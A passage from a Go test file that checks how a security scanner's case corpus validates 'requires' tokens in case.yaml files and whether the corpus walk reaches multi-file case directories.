		},
		{
			name:    "unknown token",
			yaml:    header + "requires:\n  - totally_bogus_token\n",
			wantErr: "invalid requires value",
		},
		{
			name: "valid tokens pass",
			yaml: header + "requires:\n  - mcp_tool_poison_scanning\n  - mcp_tool_baseline\n",
		},
		{
			name: "comments inside the block are ignored",
			yaml: header + "requires:\n  # why this case needs a baseline\n  - mcp_tool_baseline\n",
		},
		{
			name: "block ends at the next top-level key",
			yaml: header + "requires:\n  - mcp_tool_baseline\nfalse_positive_risk: medium\n",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			path := filepath.Join(dir, "case.yaml")
			if err := os.WriteFile(path, []byte(tt.yaml), 0o600); err != nil {
				t.Fatal(err)
			}

			errors := validateMultiFileRequires(path)
			if tt.wantErr == "" {
				if len(errors) > 0 {
					t.Errorf("expected no errors, got: %v", errors)
				}
				return
			}
			assertContainsError(t, errors, tt.wantErr)
		})
	}
}

// The corpus walk must actually reach case.yaml files inside a multi-file case
// directory. Without this the guard above is correct but never invoked, which
// is the exact shape of a check that exists and checks nothing.
func TestRunCasesReachesMultiFileCases(t *testing.T) {
	// A valid single-file case must be present, otherwise runCases fails with
	// "no case files found" and the assertion below would pass for a reason
	// that has nothing to do with the multi-file walk.
	newCorpus := func(t *testing.T) string {
		t.Helper()
		dir := t.TempDir()
		writeCase(t, dir, "url", "url-test-001.json", caseWithRequires(`[]`))
		return dir
	}

	writeDriftCase := func(t *testing.T, dir, requires string) {
		t.Helper()
		caseDir := filepath.Join(dir, "mcp-drift", "mcp-drift-test-001")
		if err := os.MkdirAll(caseDir, 0o750); err != nil {
			t.Fatal(err)
		}
		yaml := "schema_version: 1\nid: mcp-drift-test-001\nrequires:\n  - " + requires + "\n"
		if err := os.WriteFile(filepath.Join(caseDir, "case.yaml"), []byte(yaml), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	// Control: the same corpus without a multi-file offender must pass, proving
	// the failure below comes from the case.yaml and not from the corpus shape.
	t.Run("clean corpus passes", func(t *testing.T) {
		dir := newCorpus(t)
		writeDriftCase(t, dir, "mcp_tool_baseline")
		if code := runCases(dir); code != 0 {
			t.Errorf("expected a clean corpus to pass, got exit %d", code)
		}
	})

	t.Run("difficulty flag in a multi-file case fails the run", func(t *testing.T) {
		dir := newCorpus(t)
		writeDriftCase(t, dir, "encoding_evasion_scanning")
		if code := runCases(dir); code == 0 {
			t.Error("expected runCases to fail on a multi-file case carrying a difficulty flag, got exit 0")
		}
	})
}
